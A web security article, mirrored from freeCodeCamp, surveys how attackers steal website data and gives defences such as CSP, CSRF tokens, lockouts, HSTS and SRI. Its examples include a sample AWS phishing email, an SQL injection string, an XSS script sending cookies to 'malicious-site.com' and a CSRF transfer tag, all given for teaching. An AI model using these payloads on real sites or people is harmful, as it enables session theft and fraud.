---
lang: en-US
title: "How Attackers Steal Data from Websites (And How to Stop Them)"
description: "Article(s) > How Attackers Steal Data from Websites (And How to Stop Them)"
icon: fas fa-shield-halved
category:
  - DevOps
  - Security
  - NGINX
  - JavaScript
  - Article(s)
tag:
  - blog
  - freecodecamp.org
  - devops
  - sec
  - security
  - nginx
  - js
  - javascript
head:
  - - meta:
    - property: og:title
      content: "Article(s) > How Attackers Steal Data from Websites (And How to Stop Them)"
    - property: og:description
      content: "How Attackers Steal Data from Websites (And How to Stop Them)"
    - property: og:url
      content: https://chanhi2000.github.io/bookshelf/fcc/how-attackers-steal-data-from-websites-and-how-to-stop-them.html
prev: /devops/security/articles/README.md
date: 2025-06-12
isOriginal: false
author:
  - name: Alex Tray
    url : https://freecodecamp.org/news/author/trayalex812/
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1748376908250/fabf8346-d3fb-47ff-940b-f30b6e476ca5.png
---

# {{ $frontmatter.title }} 관련

```component VPCard
{
  "title": "Security > Article(s)",
  "desc": "Article(s)",
  "link": "/devops/security/articles/README.md",
  "logo": "/images/ico-wind.svg",
  "background": "rgba(10,10,10,0.2)"
}
```

```component VPCard
{
  "title": "NGINX > Article(s)",
  "desc": "Article(s)",
  "link": "/devops/nginx/articles/README.md",
  "logo": "/images/ico-wind.svg",
  "background": "rgba(10,10,10,0.2)"
}
```

```component VPCard
{
  "title": "JavaScript > Article(s)",
  "desc": "Article(s)",
  "link": "/programming/js/articles/README.md",
  "logo": "/images/ico-wind.svg",
  "background": "rgba(10,10,10,0.2)"
}
```

[[toc]]

---

<SiteInfo
  name="How Attackers Steal Data from Websites (And How to Stop Them)"
  desc="Across platforms, behind every app, and on your own website, hackers may patiently wait.  These days, everyone should have identity theft protections, and be informed about data threats lurking in the trenches of the world-wide-web’s war on privacy a..."
  url="https://freecodecamp.org/news/how-attackers-steal-data-from-websites-and-how-to-stop-them"
  logo="https://cdn.freecodecamp.org/universal/favicons/favicon.ico"
  preview="https://cdn.hashnode.com/res/hashnode/image/upload/v1748376908250/fabf8346-d3fb-47ff-940b-f30b6e476ca5.png"/>

Across platforms, behind every app, and on your own website, hackers may patiently wait.

These days, everyone should have identity theft protections, and be informed about data threats lurking in the trenches of the world-wide-web’s war on privacy and personal information. To prevent hacks, reduce liabilities, and keep information secure, you should know how hackers steal data from websites.

When your precious data is taken, sold, and circulated, the damage is not nearly done. Unlike stolen items, data theft opens up new frightening risks: weeks of auditing, months of new expenses, years of legal consequences, on and on. Stolen website data burns people, steals identities, and hurts businesses.

More than ever, website data theft sustains a torrential stream of new class action lawsuits. Even with careful design and strong [<VPIcon icon="fas fa-globe"/>internal security practices](https://flowlu.com/blog/productivity/growing-a-team-with-a-strong-focus-on-security-and-compliance/) like employee training and compliance protocols, [<VPIcon icon="fas fa-globe"/>website data breaches](https://termly.io/resources/articles/biggest-data-breaches/) continue to escalate.

Companies, developers, and users all endure the sting of the data breach. News and social media storms publicize the horror of these "heists." Steel-faced cybersecurity starts with knowing hackers’ modes of attack.

In this article, we'll explore common ways that attackers steal data, as well as a step-by-step plan you can use to enhance your website’s security.

Hackers employ various tactics to deceive users and exploit website vulnerabilities.

From phishing schemes to aiming to exploit outdated design elements, your first line of defense will be knowing the hacker's most predictable methods.

Here are some of the most common types of attacks:

- **High-risk credentials**: Sellers organize credentials by platform - like email, banking, social, and so on - and sell batches of these details in bulk.
- **Identity fraud:** From a dark web identity, attackers could get everything needed to impersonate you (name, birthdate, SSN, address, home title, and more).
- **Data trading**: Hackers test email, phone, password details across many platforms to capture valuable information and co-opt accounts.
- **Individual extortion**: Sensitive formats - like private messages, images, or financial records - can be used against victims of data theft as blackmail.

Now let’s take a deeper look into some specific scams and how to protect yourself against them.

---

## 1. Phishing and Social Engineering

Phishing and social engineering attacks rely on tricking people, not just machines.

Attackers pose as trusted contacts or organizations and try to manipulate users into revealing sensitive information or performing risky actions. These attacks can come through convincing emails, text messages, and even [<VPIcon icon="fas fa-globe"/>VoIP phone calls](https://cloudtalk.io/blog/5-common-voip-security-risks-that-might-threaten-your-business/). Some even use AI in call center operations to sound more legitimate.

- **Phishing** tricks users into revealing sensitive passwords and information by posing as a trustworthy website.
- **Social engineering** manipulates people to share personal information and lower cybersecurity defenses.

More advanced attempts to steal data are described as spear-phishing or "BEC" (business email compromise).

- **Spear-phishing** targets individuals with attacks designed for specific individuals or groups.
- **Business Email Compromise (BEC)** impersonates executives to request or authorize fraudulent transactions.

Here’s an example of a phishing email that may land in your inbox:

![](https://lh7-rt.googleusercontent.com/docsz/AD_4nXeG_BFg3-yAujDNS1rKr2JUkogtOC4oedphrNR7dJr4CMdhKFrcsj3oJR0KaxTmrLzg1f2dKl1ml8KsojIScPdDPN38_E8vytWSAeL9ub5KxAhhhFLeAdo50zZbwPJwwj1xQmJcUA?key=BWNWCCilXXEL-m-TnJSXQ5rh)

This email, ostensibly from AWS, says:

::: info <VPIcon icon="fas fa-envelope"/>email

> “Dear Valued Customer,
> 
> As part of our ongoing security enhancements, we have identified **a** **critical vulnerability** affecting your AWS environment. To prevent potential threats and ensure compliance with the latest security standards, an immediate security update is required.
> 
> Please log in to the **AWS Security Update Portal** and confirm your credentials to apply the necessary updates. [Link to portal]
> 
> Failure to complete this update **within the next 24 hours** may result in **temporary access restrictions to your AWS account.** If you have any questions, please feel free to contact our support team at +1 408 738 7799. Thank you for your prompt attention to this matter.
> 
> Best Regards,  
> **AWS Security Team**  
> (AWS Support ID: #74829)  
> phone: +1 408 738 7799”

:::

The email appears urgent and looks like it came from a trusted source. But the link leads to a spoofed website designed to steal login credentials. Phishing attacks often use this combination of urgency, official-looking branding, and impersonated email addresses to deceive users.

### How to Prevent Phishing and Social Engineering

#### 1. Train users regularly and thoroughly

Educating employees is the most effective first line of defense. Regularly educate employees about phishing tactics, common warning signs, and how to recognize suspicious messages.

In training sessions, include real examples of phishing emails, simulate attacks within your organization, and review the latest tactics used by scammers. Employees should know how to identify red flags like unfamiliar sender addresses, suspicious attachments, and urgent language that pressures immediate action. Reinforce the idea that it's okay to pause and question anything that feels off.

#### 2. Filter emails and use threat detection tools

Use advanced security and [<VPIcon icon="fas fa-globe"/>email management tools](https://clean.email/blog/email-security/email-security-software) to detect and quarantine phishing attempts before they reach inboxes. For example, [<VPIcon icon="fas fa-globe"/>cloud email security](https://guardiandigital.com/resources/blog/what-is-cloud-email-security-how-does-it-benefit-businesses) can help prevent attacks like phishing and ransomware from reaching your users.

These tools scan incoming emails for known malicious links, spoofed sender domains, and odd formatting. Some even add warning banners to emails that originate outside the organization.

#### 3. Require MFA across all systems

Enforce [<VPIcon icon="fa-brands fa-wikipedia-w"/>multi-factor authentication](https://en.wikipedia.org/wiki/Multi-factor_authentication) across systems, so stolen passwords alone can’t unlock accounts.

Because even the best-trained employees can make mistakes. That’s where MFA comes in - it acts as a strong safety net by requiring an additional step (like a code sent to a phone or biometric login) before granting access to accounts.

This way, even if a password is compromised, attackers can’t log in without the second authentication factor. Make MFA mandatory for all critical tools, including email platforms, cloud services, and administrative panels.

To enable MFA (2-Step Verification) on your Google account:

1. Go to [<VPIcon icon="fa-brands fa-google"/>Google Account Settings](https://myaccount.google.com/).
2. Click on Security in the left sidebar.
3. Under "Signing in to Google", select 2-Step Verification and click Get Started.
4. Follow the prompts to verify your password, then choose your second factor (e.g., SMS, authenticator app, or hardware key).

Once enabled, you'll be prompted to enter a code from your second factor every time you log in from an unrecognized device.

#### 4. Verify unusual requests

Instruct users to confirm unusual or sensitive requests by contacting the sender through trusted channels.

Many phishing attacks rely on social engineering tactics that impersonate executives, vendors, or IT staff. Teach employees to never trust high-risk requests such as wire transfers, password resets, or requests for sensitive data without verifying them first.

Emphasize that verification must happen through a separate channel. For example, calling the person directly or messaging them through a known company app. Simply replying to the original email or message could mean continuing the conversation with the attacker.

---

## 2. SQL Injection, XSS, and CSRF

Rather than "conning" users, these attacks exploit weaknesses in web elements and architecture.

Using malicious queries, scripts, and requests, hackers can bypass authentication, capture cookie data, and force transactions. They often target the very forms and scripts businesses rely on to capture leads or gather customer data.

### SQL Injection

Hackers send SQL codes through form input fields, the search bar, or URL parameters to access website databases. If the input isn't properly validated or sanitized, the database executes the attacker's code that will manipulate and [<VPIcon icon="fas fa-globe"/>expose sensitive data on the dark web](https://aura.com/learn/how-to-find-out-if-my-information-is-on-the-dark-web).

SQL injection exploits unvalidated input fields to search, modify, or delete records from within the database.

::: tip SQL injection example:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '';
```

:::

### Cross-Site Scripting (XSS)

Scripts are injected into web pages, leveraging them against future users.

Cross-Site Scripting (XSS) means that attackers can use scripts on web pages to steal session information from cookies or redirect users to "impersonation" sites.

Here’s how it works: A hacker injects a malicious script into a public form (such as a comment section). The website then displays the comment without sanitizing the content. Eventually, other users load the page and unknowingly run the attacker's script.

::: tip XSS example

```html
<script>document.location='http://malicious-site.com?cookie='+document.cookie;</script>
```

:::

### Cross-Site Request Forgery (CSRF)

These requests manipulate website users into unwanted actions.

Cross-Site Request Forgeries (CSRFs) attacks happen when a malicious site tricks a user’s browser into making an unwanted request to another site where they're already authenticated into transferring funds, changing contact information, or sharing account details.

Here’s an example: A logged-in user visits a malicious website. Without realizing it, the user's browser submits a hidden request to their legitimate bank site. The action (such as transferring money) happens under the user’s logged-in session without their approval.

::: tip CSRF example

```html
<img src="http://bank.com/transfer?amount=1000&to=attacker_account">
```

:::


### How to Prevent Script Injection Hacks

To stop injection and scripted attacks, you and your team need to be aware of how they happen (which you now are) and how to prevent them. This means you’ll need to proactively build security measures into the website's architecture.

These hacks thrive on technical oversight - like unsanitized input fields, insecure headers, and weak session validations.

#### 1. Validate all user input to eliminate unsafe entries

One of the most common ways attackers exploit web applications is by injecting malicious code into unvalidated fields. Every input field, whether it’s for a name, local phone number, or comment, should be treated as a potential attack vector.

Always validate input both on the client side (for user experience) and the server side (for actual security).

For example, a “phone number” field should only accept digits, not special characters or scripts. Without strict validation, attackers can slip malicious code into your application that interacts directly with your database or browser DOM.

#### 2. Use secure frameworks and ORMs to sanitize database queries

Manually writing SQL queries is risky, especially when those queries include user input. Instead, rely on trusted Object-Relational Mapping (ORM) tools like SQLAlchemy for Python, Hibernate for Java, or Eloquent for PHP.

These tools automatically sanitize inputs and parameterize queries, which means injected scripts or SQL statements won’t be executed as commands. This significantly reduces the chances of SQL injection and other code-based attacks that target your database infrastructure.

#### 3. Control what types of content browsers are allowed to load

Cross-site scripting (XSS) attacks often hide malicious code in scripts, images, or style sheets. To stop them, configure strict content security policies (CSPs) that tell browsers which resources are allowed to load on your site.

For instance, you can block JavaScript from third-party domains or restrict images and styles to those hosted on your server. This acts like a parental control system. It ensures that even if an attacker manages to inject a script, it won’t be executed if it violates the CSP rules.

To implement this kind of browser-level protection, you can define a Content Security Policy (CSP) that specifies which sources of content are considered trustworthy. Here's a basic example:

```html
<meta 
  http-equiv="Content-Security-Policy" 
  content="default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' https://trusted-image-cdn.com;"
>
```

In this example, the CSP restricts all content (default-src) to only load from the same origin ('self'). JavaScript, CSS, and images are similarly restricted, with an exception that allows images from a trusted CDN. This kind of rule prevents the browser from loading scripts or assets from unapproved third-party domains.

#### 4. Implement CSRF tokens to protect against cross-site request forgery

Cross-site request forgery (CSRF) tricks users into submitting unwanted actions on a web application where they’re already authenticated - like transferring money or changing passwords.

To stop this, implement unique, per-session CSRF tokens in every form submission. These tokens must be checked server-side to confirm that the request originated from your own site. Without a valid token, the server should automatically reject the request, which prevents attackers from forging it.

Here’s how a CSRF token might look in an HTML form:

```html
<form action="/update-profile" method="POST">
  <input type="hidden" name="csrf_token" value="d7f5e3c2a6b8...">
  <input type="text" name="username">
  <button type="submit">Update</button>
</form>
```

On the server side, you should generate a unique token per user session and store it securely (for example, in a session or cookie). Every time a form is submitted, the server checks whether the submitted token matches the one it issued. If it doesn't, the request is rejected.

#### 5. Limit user privileges to reduce the blast radius of a breach

Don’t give full access to every user or system area. If lower-level accounts get compromised, limited access can wall off high-value data.

Set strict permission levels across your site, assigning the least privilege necessary for each role. If a lower-level account is compromised - say, a regular user or junior staff login - the damage is contained because that account can’t reach sensitive data or critical systems.

This principle of least privilege is essential for reducing exposure and protecting high-value assets even when other defenses fail.

This is where **role-based access control (RBAC)** comes in. With RBAC, you assign each user a role (like admin, editor, or viewer), and limit what actions they’re allowed to perform.

For example, in Node.js with Express:

```js
function checkAdmin(req, res, next) {
  if (req.user && req.user.role === 'admin') {
    next();
  } else {
    res.status(403).send('Access denied.');
  }
}

// Apply this middleware to protect admin-only routes
app.post('/delete-user', checkAdmin, (req, res) => {
  // delete logic
});
```

---

## 3. Brute Force Password Attacks

"Simple" attacks are still effective. When users rely on weak and reused passwords, brute force attacks identify login credentials using lists of common passwords and number-word-symbol combinations.

Attackers don’t need insider knowledge to succeed. They bet on patterns of human behavior. Default passwords, especially for shared corporate accounts (like "admin123!") or credentials reused across sites can get leaked in breaches completely unrelated to your website.

Hackers can try thousands of possibilities in two or three seconds. Bots can work to force access by testing 10,000 or 100,000 of the most-used passwords. Even if 1% of these passwords work, hundreds (or thousands) of accounts can be cracked open in two minutes.

### How to Stop Brute Force Hacking

Requiring a mix of uppercase, lowercase, numbers, symbols, and character-length minimums can make brute force less attractive. For most sites, minimum password length should be at least 12 characters. Certain sites should demand more.

#### 1. Use temporary account lockouts after multiple failed attempts

Lock accounts temporarily after 5-10 failed login attempts. This is one of the most effective ways to deter brute force attacks as it halts attackers from trying endless password combinations and dramatically slows down their efforts.

Even if an attacker uses bots or distributed IPs, these lockouts force them to start over or wait, buying you time to detect and respond to the threat. Some systems also offer progressive delays or account alerts after repeated failures to add an extra layer of defense.

Here’s an example in Node.js using Express and a simple in-memory store:

```js :collapsed-lines
const loginAttempts = {}; // Should be stored in a database or cache like Redis in production
const MAX_ATTEMPTS = 5;
const LOCKOUT_TIME = 10 * 60 * 1000; // 10 minutes

function checkLockout(req, res, next) {
  const username = req.body.username;
  const userAttempts = loginAttempts[username] || { count: 0, lockUntil: null };

  if (userAttempts.lockUntil && Date.now() < userAttempts.lockUntil) {
    return res.status(429).send('Account is temporarily locked. Try again later.');
  }

  req.userAttempts = userAttempts;
  next();
}

app.post('/login', checkLockout, (req, res) => {
  const { username, password } = req.body;
  const isValid = authenticate(username, password); // Your auth logic here

  if (!isValid) {
    const attempts = req.userAttempts;
    attempts.count += 1;

    if (attempts.count >= MAX_ATTEMPTS) {
      attempts.lockUntil = Date.now() + LOCKOUT_TIME;
    }

    loginAttempts[username] = attempts;
    return res.status(401).send('Invalid credentials.');
  }

  // Successful login: reset attempts
  delete loginAttempts[username];
  res.send('Login successful!');
});
```

In production, you'd store login attempt data in a persistent or distributed system like Redis or your database. Many frameworks and platforms also support lockout policies natively or via security libraries, so you can configure them without writing this from scratch.

#### 2. Require MFA to block unauthorized access

Even if a password is guessed, multi-factor authentication (MFA) prompts like a text message or in-app code can block brute force access.

As explained before, with MFA, users must provide a second form of verification - like a time-sensitive code from an authentication app, a push notification, or a text message. This makes it extremely difficult for attackers to succeed, since they rarely have access to the victim’s second device or method of authentication.

#### 3. Add CAPTCHA to prevent bot-driven password guessing

Prevent bots from flooding login endpoints by throttling repeated access or requiring CAPTCHAs.

CAPTCHA tests distinguish human users from bots, forcing attackers to solve visual puzzles or interact with images - something bots can’t easily do. This drastically slows automated attempts and protects your login endpoints from being overwhelmed.

#### 4. Avoid defaults and reused credentials on all systems

Prevent repeating, past, or default credentials on devices, CMS plugins, and admin accounts before going live.

If these aren’t changed before going live, they become open doors for attackers. The same goes for reused credentials from past breaches. Brute force hackers often try known leaked passwords first. Ensure that all accounts - especially those with admin privileges - are set up with unique, strong, and non-repetitive credentials. Implement tools that scan for weak or default passwords before deployment.

---

## 4. Malware and Malicious Scripts

The "mal" in malware is short for "malicious." One of the more destructive tools in the hacker arsenal, malware can capture keystrokes, hijack systems, steal data, and introduce many more varieties of unpleasantness:

- **Keyloggers** record user keystrokes to steal credentials and account numbers.
- **Spyware** can monitor all user activity and viewed content without consent.
- **Ransomware** encrypts entire systems and demands payment for safe "return."

Simply visiting a compromised or spoofed site can start installing malware without clicking anything. Hackers also embed malware in online ads by exploiting commercial networks - even on the most "legitimate" sites. Then, free themes, apps, and third-party plugins from unverified publishers can leave websites full of "backdoors."

### How to Prevent Website Malware

You can use many tools to scan your website or emails for links, attachments, or media hiding malware packages inside. Regularly run a domain blacklist checker to ensure your site hasn't been flagged by security databases, which can block your domain from emails, search engines, or browser warnings. Outside these findings, stay true to the first principles of safe downloads, smart updates, and secure uploading:

#### 1. Trust only reputable downloads and verified sources

Stick to official repositories, theme stores, and plugin developers with positive reputations and clear authorship when downloading website components like a Wordpress theme, plugins, or JavaScript library.

Avoid “nulled” or cracked versions of paid software, as these are common vehicles for hidden malware. Vet every third-party tool for reputation and transparency before adding it to your tech stack.

#### 2. Keep all software, plugins, and platforms up to date

Outdated CMS platforms, plugins, and server-side scripts are some of the most common vulnerabilities exploited by malware. Hackers actively scan for known security flaws in older versions of software.

To stay ahead, enable automatic updates whenever possible, or establish a consistent patching schedule (weekly or monthly) to check and apply updates across your stack. Don’t overlook minor version updates as they often contain critical security fixes.

#### 3. Scan and restrict user-uploaded files

If your site allows user uploads, like pictures or attachments, scan every file for malware while enforcing file types.

Enforce strict upload rules: limit file types to only what’s necessary (for example, .jpg, .png, .pdf), apply maximum file size limits, and run malware scans on each file before it’s processed or stored. Use server-side validation and sandboxing to inspect uploads without risking your core infrastructure.

#### 4. Run regular malware and domain blacklist scans

Proactively scan your website for malware using security tools like Sucuri, VirusTotal, or your hosting provider’s built-in scanners. These tools help detect suspicious code, hidden iframes, malicious redirects, or trojan injections.

You can also use a domain blacklist checker to ensure your website hasn’t been flagged by Google Safe Browsing, Norton Safe Web, or other security databases. Being blacklisted can prevent your emails from reaching inboxes and may trigger browser security warnings for visitors.

#### 5. Limit admin access and use secure file permissions

Malware infections often stem from weak admin access policies. Limit the number of users who have backend access, especially to high-privilege areas.

Use unique, strong passwords and multi-factor authentication for all admin accounts. On the server side, set strict file permissions (for example, 644 for files and 755 for directories) to prevent unauthorized modifications. Avoid giving full write access unless absolutely necessary.

---

## 5. Man-in-the-Middle Attacks and Public Connections

Man-in-the-Middle (MitM) attacks intercept data between a user and a website - especially over unsecured or public networks like Wi-Fi in a coffee shop.

Whenever you send or receive data, there’s always a chance someone is actively listening. After ordering their latte, a customer logs into their account on public Wi-Fi. Meanwhile, a hacker's "packet sniffer" captures the session's cookies, hijacking their account.

Packet sniffing is a technique where attackers use software tools to monitor and capture data packets transmitted over a network. On unsecured Wi-Fi and without encryption, these tools can pick up login details, messages, or even credit card numbers.

### How to Secure Personal Data Connections

A combination of education and SSL certificates cut out "middle man" hacks and attacks. Here are ways to enforce these protections:

#### 1. Use HTTPS to encrypt all browser-server communications

HTTPS ensures that data transferred between a user's browser and your website is encrypted, preventing attackers from intercepting login credentials, form submissions, or payment details.

To implement this, install an SSL/TLS certificate on your site. Most hosting providers now offer free SSL certificates through services like Let’s Encrypt, and many platforms make installation simple.

Here’s how to install an SSL certificate using Let’s Encrypt on a server running Nginx:

```sh
# Step 1: Install Certbot
sudo apt update
sudo apt install certbot python3-certbot-nginx

# Step 2: Run Certbot to get and install your certificate
sudo certbot --nginx

# Certbot will prompt you to choose your domain and configure HTTPS automatically
```

If you're using a managed hosting provider like Bluehost, SiteGround, or Shopify, you can typically enable HTTPS with just a few clicks in your dashboard. That means no code or terminal commands required.

#### 2. Redirect all HTTP traffic to HTTPS automatically

Having an SSL certificate isn’t enough if users can still access your site through unsecured HTTP. Set up automatic redirection rules (via `.htaccess` or server settings) to ensure that every visit is routed through HTTPS.

Here’s how to set up HTTPS redirection using `.htaccess` on an Apache server:

```apache
RewriteEngine On
RewriteCond %{HTTPS} off
RewriteRule ^(.*)$ https://%{HTTP_HOST}%{REQUEST_URI} [L,R=301]
```

But most modern hosting platforms (like Netlify, Vercel, or Cloudflare) allow you to enable this redirect with a toggle in the dashboard—no manual config needed.

This step ensures that no part of your site can be accessed insecurely, closing the door on potential Man-in-the-Middle attacks that rely on intercepting data from unencrypted connections.

#### 3. Educate users on risks and promote safe browsing habits

Even if your website is secure, users accessing it through public or unsecured networks (like airport or coffee shop Wi-Fi) are still vulnerable. Encourage users to use VPN tools and protective software to "tunnel" their data directly when using websites on public networks.

A VPN creates a private, encrypted tunnel for their internet activity, adding another layer of protection between them and potential attackers. You can include this advice in help center articles, login pages, or during onboarding for security-conscious services.

#### 4. Implement HTTP Strict Transport Security (HSTS).

HSTS is a response header that tells browsers to always connect via HTTPS - even if a user manually types “http://”. This eliminates the risk of SSL stripping attacks, where hackers downgrade secure HTTPS connections to insecure HTTP to intercept data. Configuring HSTS ensures long-term enforcement of secure access and further hardens your website’s security posture.

To enable HSTS, add this response header to your server configuration or .htaccess file:

```apache
Header always set Strict-Transport-Security "max-age=63072000; includeSubDomains; preload"
```

- max-age=63072000 sets the policy to last for two years (in seconds).
- includeSubDomains applies HSTS to all subdomains.
- preload allows your domain to be included in browser preload lists for even stronger protection (requires submission to [<VPIcon icon="fas fa-globe"/>hstspreload.org](https://hstspreload.org)).
    
HSTS adds another layer of insurance. Once a browser sees this header, it refuses to connect to your site via HTTP ever again

#### 5. Disable outdated or vulnerable protocols and ciphers

As SSL/TLS standards evolve, older versions (like SSL 2.0 or TLS 1.0) are no longer secure and should be disabled on your server. Instead, enforce the use of TLS 1.2 or higher.

Also, configure your server to only support strong cipher suites and disable weak ones to prevent downgrade and decryption attacks.

Example for NGINX:

```nginx
ssl_protocols TLSv1.2 TLSv1.3;

ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:
             ECDHE-RSA-AES256-GCM-SHA384:
             ECDHE-ECDSA-CHACHA20-POLY1305:
             ECDHE-RSA-CHACHA20-POLY1305:
             ECDHE-ECDSA-AES128-GCM-SHA256:
             ECDHE-RSA-AES128-GCM-SHA256';

ssl_prefer_server_ciphers on;
```

This setup forces modern, secure encryption while disabling old, vulnerable algorithms. After applying these settings, restart your server to enforce them.

Once your cipher suite configuration is in place, it's a good idea to test it and regularly audit your server’s SSL configuration using tools like SSL Labs to verify that your server supports only secure protocols and ciphers, and to ensure [<VPIcon icon="fas fa-globe"/>cybersecurity compliance](https://timedoctor.com/blog/cybersecurity-compliance/) with current best practices.

---

## 6. Outdated Software and Old Plugins

Outdated code is the hacker's favorite security feature. Poor maintenance not only threatens data but also damages SaaS retention. When users don’t feel safe, even the best user analytical tools can’t fix churn. Major CMS platforms (like WordPress and SquareSpace) use themes, plugins, and third-party software requiring almost constant updating.

Unknowingly, each of these could smuggle in weaknesses for data thievery. When updates are released, they often intend to fix security issues, pesky bugs, and freshly discovered vulnerabilities.

### How to Patch and Update Website Security

Public information - like official software notes about new security patches and resolved bugs - can then act as a flaw menu for attacking apps yet to update. Every user with out-of-date access poses a threat to the system. Don't let these be issues your developers have already "designed away."

#### 1. Schedule regular patching cycles for your site, apps, and services

A site, app, or service should set weekly or monthly times to check version numbers and push patch updates. You should assign responsibility to a specific team member or set up alerts to stay on top of newly released patches from software vendors.

By failing to apply updates promptly, you're leaving your systems exposed to risks that are already documented and potentially being exploited.

#### 2. Allow auto-updates wherever safe and possible

Most CMS platforms for publishing sites include the option for installing automatic updates to core files and plugins.

Enabling this can dramatically reduce your site's vulnerability window, especially for minor updates and security patches. While some major updates may still require testing before implementation, enabling automatic updates for critical security releases ensures your site isn't left behind while you wait for manual intervention.

#### 3. Audit and remove unused software, plugins, and themes

The most dangerous security flaws are the forgotten ones, so remove unused themes or plugins before they can be exploited.

Make it a habit to run regular audits of your system, remove anything you’re not actively using, and replace poorly maintained tools with better-supported alternatives. Even dormant or inactive themes can contain vulnerable code that can be exploited if not cleaned out.

---

## 7. APIs, Integrations, and Third-Party Attacks

The vast majority of websites depend on API connections and third-party scripts to monitor analytics to process payments. Every connection - no matter how slight - should come with a warning.

Like late-to-update users, attackers also exploit APIs to bypass authentication, use third-party tools to extract data, and infect partner sites with malware. Your own code may be watertight, flawless, and impenetrable - but insecure APIs and third-party tools share their every weakness.

Consider a supply chain attack. A JavaScript library embedded on thousands of sites is wrapped up with multiple malware scripts. The sites who rely on the library become new territory for attack, draining user data from hundreds of sites that rely on that library.

### How to Secure Integrations and APIs

#### 1. Require strong authentication for all API and integration requests

A third-party app, plugin, or external script, and every other connection to your system should prove its identity before accessing your data or services.

This is typically done using secure methods like API keys, OAuth tokens, or client certificates.

- **API keys:** These are unique tokens generated by your system and issued to approved clients. Clients include the key in their request headers (e.g., Authorization: Bearer YOUR_API_KEY), and your backend checks the key's validity before processing the request. While simple to implement, API keys should be rotated regularly and kept confidential.
- **OAuth tokens:** OAuth is ideal when users need to grant limited access to their data without sharing credentials. Your system acts as an authorization server and issues temporary access tokens. Clients send these tokens with requests, and your API validates them. OAuth also supports scopes and expirations, giving you fine-grained access control.
- **Client certificates:** For higher security (especially between servers), use mutual TLS (mTLS). In this setup, both the client and server authenticate each other using X.509 certificates. It adds a strong layer of trust by validating identities through cryptographic means (especially useful in banking or enterprise integrations).

By enforcing authentication, you ensure that only authorized systems can make requests, greatly reducing the risk of unauthorized access or data leaks. Rotate these keys regularly and monitor their usage to detect suspicious behavior early.

#### 2. Sanitize and validate all incoming data, even from trusted third parties

It's a mistake to assume that data from integrated partners or services is automatically safe. Every piece of data you receive, be it a payment gateway, analytics tool, or marketing app, should be treated as potentially unsafe until verified.

Apply the same input validation rules you use for end-user data: check formats, restrict values, and escape inputs before they interact with your system. This protects you from injection attacks, corrupted data, and API misuse.

To make this more concrete, here’s a simple example of how you might validate incoming data with JavaScript from a marketing app or third-party integration:

```js
function validateIncomingData(data) {
  const emailPattern = /^[^\s@]+@[^\s@]+.[^\s@]+$/;
  const phonePattern = /^\+\d{1,3}\d{7,14}$/; // E.164 international format

  if (!emailPattern.test(data.email)) {
    throw new Error("Invalid email address");
  }

  if (!phonePattern.test(data.phone)) {
    throw new Error("Invalid phone number format");
  }

  if (typeof data.campaignId !== 'string' || data.campaignId.trim() === '') {
    throw new Error("Missing or invalid campaign ID");
  }
  return true;
}
```

This snippet validates a properly formatted email address, a phone number in international format, and a non-empty campaign ID to ensure tracking consistency. By validating input like this before it’s processed or stored, you reduce the risk of injection attacks, data corruption, or accidental misuse from faulty third-party integrations

#### 3. Use Subresource Integrity (SRI) to verify third-party resources

When integrating third-party scripts (like CDNs for fonts, analytics trackers, or payment tools), use SRI tags to ensure the code hasn’t been tampered with.

SRI allows you to define a cryptographic hash for each file, and the browser will block any file that doesn’t match the expected fingerprint. This prevents malicious actors from swapping out legitimate scripts with compromised ones - and it adds a critical layer of trust and security to your frontend architecture.

Here’s how to use it:

```html
<script src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GhOaAbfDQ4b9PrZqKmWqlL8Amoy0WyyF8JCE4"
  crossorigin="anonymous"
></script>
```

- integrity: This is the SRI hash (typically SHA-256, SHA-384, or SHA-512) of the file contents.
- crossorigin: Required if the resource is hosted on a different domain. Use anonymous unless the resource requires credentials.

You can generate the SRI hash using tools like [<VPIcon icon="fas fa-globe"/>SRI Hash Generator](https://srihash.org/) or command-line tools like openssl.

#### 4. Limit third-party access to only the data and functions they need

Just because a third-party service needs access to your data doesn't mean it should have full visibility into your systems. Apply the principle of least privilege by configuring integrations with narrow scopes - limiting permissions to only the endpoints or datasets necessary for their function.

For example, an email marketing tool doesn’t need access to billing data, and a CRM shouldn’t touch your backend server settings.

#### 5. Monitor and log all third-party activity

Visibility is key to detecting abuse or performance issues. Ensure that all API requests and third-party interactions are logged, including timestamps, endpoints accessed, IP addresses, and payloads.

Use this data to detect unusual patterns (like a spike in failed requests) and respond quickly to potential breaches. Some platforms also offer rate limiting to restrict excessive or suspicious activity.

Let’s say you notice a spike in 401 (Unauthorized) responses from a specific IP over a short period. Your logs show repeated attempts to access a payment processing API without valid credentials.

```json
{
  "timestamp": "2025-05-26T14:32:10Z",
  "endpoint": "/api/v1/payments",
  "method": "POST",
  "ip": "192.0.2.45",
  "response_code": 401
}
```

What you’d do with this data:

- Temporarily block the IP or trigger a CAPTCHA challenge.
- Alert the security team or log the incident for further investigation.
- Set up a rule to flag similar behavior in the future.
- Consider enforcing stricter authentication or rotating API keys.

::: tip Pro tip

Use monitoring tools (like Datadog, New Relic, or ELK Stack) with alerting capabilities so you’re notified automatically when something suspicious happens before it escalates.

:::

#### 6. Regularly audit integrations for outdated or unused connections

Over time, your stack may accumulate unused APIs, abandoned integrations, or forgotten developer keys. These can become security liabilities if left unchecked. Periodically review all third-party connections and remove anything that’s no longer active or necessary.

For the services you do keep, confirm they’re still being maintained, updated, and follow modern security standards.

---

## Where the Dark Web Dumps Your Data

When hackers successfully breach a website’s database, the fallout goes far and wide past the single company or specific set of information.This threat extends to e-commerce platforms, which often collect customer data. That’s why following a solid [<VPIcon icon="fas fa-globe"/>e-commerce security checklist](https://spocket.co/blogs/e-commerce-security-checklist) is essential to protect sensitive information and maintain customer trust.

Data breaches expose usernames, passwords, payment details, home addresses, birthdates, and every form of personal data you can imagine. Once stolen, this data often doesn’t just sit on the shelf: it flies out from the dark web, the underbelly of the internet where your details are sold, traded, and shared among cybercriminals.

From here, public perceptions rage against brand values - and every customer’s anxiety about getting identity theft insurance starts to amplify. A reused password could become the key to Netflix, and it will do greater damage when it unlocks your Discover card, Morgan-Chase, and Coinbase accounts.

Every personal detail can help fuel identity theft, sharpen phishing attacks, and lead to system takeover. As organizations, sites face lawsuits, huge fines, and public scorn.

